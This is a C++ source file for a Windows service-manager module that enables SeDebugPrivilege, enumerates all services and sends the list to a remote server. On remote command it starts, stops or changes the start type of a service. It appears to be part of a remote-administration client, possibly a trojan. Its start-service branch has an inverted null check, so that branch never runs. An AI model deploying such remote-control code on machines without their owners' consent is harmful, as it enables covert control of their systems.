#include "stdafx.h"
#include <tchar.h>

#include "ServiceManager.h"




CServiceManager::CServiceManager(CIOCPClient *IOCPClient)
	:CManager(IOCPClient)
{
	_tprintf(_T("ServiceManager is under Execution\r\n"));
	EnableSeDebugPrivilege(SE_DEBUG_NAME, TRUE);
	SendClientServiceList();
}

CServiceManager::~CServiceManager()
{
	_tprintf(_T("ServiceManager Exit\r\n"));

	if (_M_hServiceManager != NULL)
	{
		CloseServiceHandle(_M_hServiceManager);
		_M_hServiceManager = NULL;
	}

	EnableSeDebugPrivilege(SE_DEBUG_NAME, FALSE);
}


void  CServiceManager::PacketHandleIO(PBYTE BufferData, ULONG_PTR BufferLength)
{
	switch (BufferData[0])
	{
	case CLIENT_SERVICE_REFRESH_REQUIRE:
	{
		SendClientServiceList();
		break;
	}
	case CLINET_SERVICE_CONFIG_REQUIRE:
	{
		ConfigClientService((LPBYTE)BufferData + 1, BufferLength - 1);
		break;
	}
	default:
		break;
	}
	return;
}

VOID  CServiceManager::SendClientServiceList()
{
	BYTE* BufferData = GetClientServiceList();
	if (BufferData == NULL)
		return;

	_M_IOCPClient->OnServerSending((char*)BufferData, LocalSize(BufferData));
	LocalFree(BufferData);

	return;
}

BYTE* CServiceManager::GetClientServiceList()
{
	LPENUM_SERVICE_STATUS  EnumSrvcStatus   = NULL;
	LPQUERY_SERVICE_CONFIG QuerySrvcConfig  = NULL;

	BYTE* BufferData   = NULL;
	ULONG BufferLength = 0;
	DWORD offset = 0;

	TCHAR RunWay [256];
	TCHAR AutoRun[256];

	ZeroMemory(RunWay,  sizeof(RunWay));
	ZeroMemory(AutoRun, sizeof(AutoRun));

	// 建立了一个到服务控制管理器的连接，并打开指定的数据库
	if ((_M_hServiceManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS)) == NULL)  {
		return NULL;
	}

	EnumSrvcStatus = (LPENUM_SERVICE_STATUS)LocalAlloc(LPTR, 64 * 1024);

	if (EnumSrvcStatus == NULL)
	{
		CloseServiceHandle(_M_hServiceManager);
		_M_hServiceManager = NULL;
		return NULL;
	}

	ULONG NeedsLength   = 0;
	ULONG ServicesCount = 0;
	DWORD ResumeHandle  = NULL;

	// 枚举当前系统服务
	EnumServicesStatus(
			_M_hServiceManager,
			SERVICE_TYPE_ALL,
			SERVICE_STATE_ALL,
			(LPENUM_SERVICE_STATUS)EnumSrvcStatus,
			64 * 1024,
			&NeedsLength,
			&ServicesCount,
			&ResumeHandle
		);

	BufferData = (BYTE*)LocalAlloc(LPTR, MAX_PATH);

	BufferData[0] = CLIENT_SERVICE_MANAGER_REPLY;
	offset = 1;

	for (ULONG i = 0; i < ServicesCount; i++)
	{
		SC_HANDLE hService = NULL;
		DWORD ResumeHandle = 0;

		// 打开一个存在的服务
		hService = OpenService(
							_M_hServiceManager,
							EnumSrvcStatus[i].lpServiceName,
							SERVICE_ALL_ACCESS
						);
		if (hService == NULL)
			continue;

		QuerySrvcConfig = (LPQUERY_SERVICE_CONFIG)LocalAlloc(LPTR, 4 * 1024);
		QueryServiceConfig(hService, QuerySrvcConfig, 4 * 1024, &ResumeHandle);

		if (EnumSrvcStatus[i].ServiceStatus.dwCurrentState != SERVICE_STOPPED)
		{
			ZeroMemory(RunWay, sizeof(RunWay));
			_tcscat(RunWay, _T("Running"));
		}
		else
		{
			ZeroMemory(RunWay, sizeof(RunWay));
			_tcscat(RunWay, _T(" "));
		}

		if (QuerySrvcConfig->dwStartType == SERVICE_AUTO_START)
		{
			ZeroMemory(AutoRun, sizeof(AutoRun));
			_tcscat(AutoRun, _T("Automatic"));
		}
		if (QuerySrvcConfig->dwStartType == SERVICE_DEMAND_START)
		{
			ZeroMemory(AutoRun, sizeof(AutoRun));
			_tcscat(AutoRun, _T("Manual"));
		}
		if (QuerySrvcConfig->dwStartType == SERVICE_DISABLED)
		{
			ZeroMemory(AutoRun, sizeof(AutoRun));
			_tcscat(AutoRun, _T("Disabled"));
		}

		BufferLength = sizeof(TCHAR)*(
						      _tcslen(EnumSrvcStatus[i].lpDisplayName)+ 1
							+ _tcslen(EnumSrvcStatus[i].lpServiceName)+ 1
							// + _tcslen(QuerySrvcConfig->lpBinaryPathName)+ 1
							+ _tcslen(RunWay) + 1 + _tcslen(AutoRun) + 1);

		if (LocalSize(BufferData) < (offset + BufferLength))
			BufferData = (BYTE*)LocalReAlloc(
										BufferData,
										offset + BufferLength,
										LMEM_ZEROINIT | LMEM_MOVEABLE
									);
		// [DisplayName][ServiceName][RunWay][AutoRun]
		memcpy(BufferData + offset,
			   EnumSrvcStatus[i].lpDisplayName,
			   (_tcslen(EnumSrvcStatus[i].lpDisplayName) + 1) * sizeof(TCHAR)
			);
		offset += (_tcslen(EnumSrvcStatus[i].lpDisplayName) + 1) * sizeof(TCHAR);

		memcpy(BufferData + offset,
			   EnumSrvcStatus[i].lpServiceName,
			  (_tcslen(EnumSrvcStatus[i].lpServiceName) + 1) * sizeof(TCHAR)
			);
		offset += (_tcslen(EnumSrvcStatus[i].lpServiceName) + 1) * sizeof(TCHAR);

		/*memcpy(BufferData + offset,
			   QuerySrvcConfig->lpBinaryPathName,
			  (_tcslen(QuerySrvcConfig->lpBinaryPathName) + 1) * sizeof(TCHAR)
			);
		offset += (_tcslen(QuerySrvcConfig->lpBinaryPathName) + 1) * sizeof(TCHAR);*/
	
		memcpy(BufferData + offset, RunWay, (_tcslen(RunWay) + 1) * sizeof(TCHAR));
		offset += (_tcslen(RunWay) + 1) * sizeof(TCHAR);

		memcpy(BufferData + offset, AutoRun, (_tcslen(AutoRun) + 1) * sizeof(TCHAR));
		offset += (_tcslen(AutoRun) + 1) * sizeof(TCHAR);
	
		CloseServiceHandle(hService);
		LocalFree(QuerySrvcConfig);
	}

	CloseServiceHandle(_M_hServiceManager);
	LocalFree(EnumSrvcStatus);

	return BufferData;
}

void  CServiceManager::ConfigClientService(PBYTE BufferData, ULONG BufferLength)
{
	BYTE IsMethod = BufferData[0];
	TCHAR* ServiceName = (TCHAR*)(BufferData + 1);
	switch (IsMethod)
	{
	case 1:
	{
		SC_HANDLE hServiceManager =
							OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
		if (NULL == hServiceManager)
		{
			SC_HANDLE hService = OpenService(
									hServiceManager,
									ServiceName,
									SERVICE_ALL_ACCESS
								);
			if (NULL != hService)
			{
				StartService(hService, NULL, NULL);
				CloseServiceHandle(hService);
			}
			CloseServiceHandle(hServiceManager);
		}
		Sleep(500);
		SendClientServiceList();
		break;
	}
	case 2:
	{
		SC_HANDLE hServiceManager =
							OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
		if (NULL != hServiceManager)
		{
			SC_HANDLE hService = OpenService(
										hServiceManager,
										ServiceName,
										SERVICE_ALL_ACCESS
									);
			if (NULL != hService)
			{
				SERVICE_STATUS Status;
				BOOL IsOk = ControlService(hService, SERVICE_CONTROL_STOP, &Status);
				CloseServiceHandle(hService);
			}
			CloseServiceHandle(hServiceManager);
		}
		Sleep(500);
		SendClientServiceList();
		break;
	}
	case 3:
	{
		SC_HANDLE hServiceManager =
			OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
		if (NULL != hServiceManager)
		{
			SC_HANDLE hService = OpenService(
										hServiceManager,
										ServiceName,
										SERVICE_ALL_ACCESS
									);
			if (NULL != hService)
			{
				SC_LOCK SrvcLock = LockServiceDatabase(hServiceManager);
				BOOL IsOk = ChangeServiceConfig(
											hService,
											SERVICE_NO_CHANGE,
											SERVICE_AUTO_START,
											SERVICE_NO_CHANGE,
											NULL,
											NULL,
											NULL,
											NULL,
											NULL,
											NULL,
											NULL
										);
				UnlockServiceDatabase(SrvcLock);
				CloseServiceHandle(hService);
			}
			CloseServiceHandle(hServiceManager);
		}
		Sleep(500);
		SendClientServiceList();
		break;
	}
	case 4:
	{
		SC_HANDLE hServiceManager =
			OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
		if (NULL != hServiceManager)
		{
			SC_HANDLE hService = OpenService(
										hServiceManager,
										ServiceName,
										SERVICE_ALL_ACCESS
									);
			if (NULL != hService)
			{
				SC_LOCK v1 = LockServiceDatabase(hServiceManager);
				BOOL IsOk = ChangeServiceConfig(
											hService,
											SERVICE_NO_CHANGE,
											SERVICE_DEMAND_START,
											SERVICE_NO_CHANGE,
											NULL,
											NULL,
											NULL,
											NULL,
											NULL,
											NULL,
											NULL
										);
				UnlockServiceDatabase(v1);
				CloseServiceHandle(hService);
			}
			CloseServiceHandle(hServiceManager);
		}
		Sleep(500);
		SendClientServiceList();
		break;
	}
	default:
		break;
	}
}
